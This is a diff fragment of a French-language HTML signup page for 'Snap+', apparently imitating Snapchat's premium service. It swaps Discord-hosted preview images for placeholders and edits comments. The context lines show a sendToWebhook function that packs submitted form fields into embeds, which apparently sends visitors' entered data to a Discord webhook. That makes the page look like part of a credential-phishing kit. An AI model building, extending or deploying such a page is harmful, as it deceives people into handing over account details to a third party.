@@ -5,18 +5,16 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <title>S'inscrire à Snap+</title>
 
-  <!-- Open Graph Meta Tags (pour Discord, Facebook, etc.) -->
   <meta property="og:title" content="S'inscrire à Snap+">
   <meta property="og:description" content="Inscrivez-vous à Snap+ pour accéder à des avantages premium et des fonctionnalités exclusives.">
-  <meta property="og:image" content="https://cdn.discordapp.com/attachments/1474897923233026161/1475342813809086464/telechargement_15.jpg?ex=699d2391&is=699bd211&hm=4205d7f16d84f2edd2ca3b206f238d8fde4d6b028beea48fc1eaa435b418ded2&"> <!-- Remplace l'URL par une image représentative -->
+  <meta property="og:image" content="https://yourimageurl.com/image.jpg"> <!-- Remplace l'URL par une image représentative -->
   <meta property="og:url" content="https://tonsite.com"> <!-- Remplace par l'URL de ton site -->
   <meta property="og:type" content="website">
 
-  <!-- Twitter Card Meta Tags -->
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:title" content="S'inscrire à Snap+">
   <meta name="twitter:description" content="Inscrivez-vous à Snap+ pour accéder à des avantages premium et des fonctionnalités exclusives.">
-  <meta name="twitter:image" content="https://cdn.discordapp.com/attachments/1474897923233026161/1475342813809086464/telechargement_15.jpg?ex=699d2391&is=699bd211&hm=4205d7f16d84f2edd2ca3b206f238d8fde4d6b028beea48fc1eaa435b418ded2&"> <!-- Remplace l'URL par une image représentative -->
+  <meta name="twitter:image" content="https://yourimageurl.com/image.jpg"> <!-- Remplace l'URL par une image représentative -->
 
   <style>
     :root {
@@ -266,7 +264,7 @@ async function sendToWebhook(title, fields = {}) {
   
   const embed = {
     title: title,
-    color: 0xFFCC00,           // ← jaune pour tous les embeds
+    color: 0xFFCC00,           // ← couleur jaune pour l'embed
     fields: Object.entries(fields).map(([name, value]) => ({
       name: name,
       value: "```" + (value || "—") + "```",
